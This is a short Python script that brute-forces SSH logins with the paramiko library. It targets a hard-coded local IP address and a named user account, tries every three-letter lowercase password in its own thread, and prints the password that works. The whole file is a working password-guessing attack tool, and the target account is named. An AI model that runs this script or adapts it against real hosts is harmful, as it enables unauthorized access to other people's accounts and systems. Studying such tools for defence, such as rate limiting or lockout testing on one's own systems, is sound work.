import paramiko, itertools, string
import time
import threading
import _thread

def attempt(IP,UserName,Password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(IP, username=UserName, password=Password)
    except paramiko.AuthenticationException:
        ssh.close()
        return
    else:
        print ('[!] %s:%s is CORRECT!' % (UserName, Password))
        _thread.interrupt_main()
    ssh.close()
    return

ip = '192.168.0.3'
username = 'michaeltruell'
###alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
start_time = time.time()
var = itertools.permutations(string.ascii_lowercase,3)
index = 0
for i in var:
    password = ''.join(i)
    index += 1
    if index % 100 == 0:
        print ("on: %s" % password)
    t = threading.Thread(target=attempt, args=(ip,username,password))
    t.start()
    '''try:
        print("password %s" % (password))
        client.connect(hostname=ip, username=username, password=password)
        print ("Success; password is: " + password)
        sys.exit(0)
    except paramiko.AuthenticationException:
        continue
    except paramiko.ssh_exception.SSHException:
        print("Exception")
        client.close()
        time.sleep(1)
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())'''


print("--- %s seconds ---" % (time.time() - start_time))
print ("Unable to find correct password")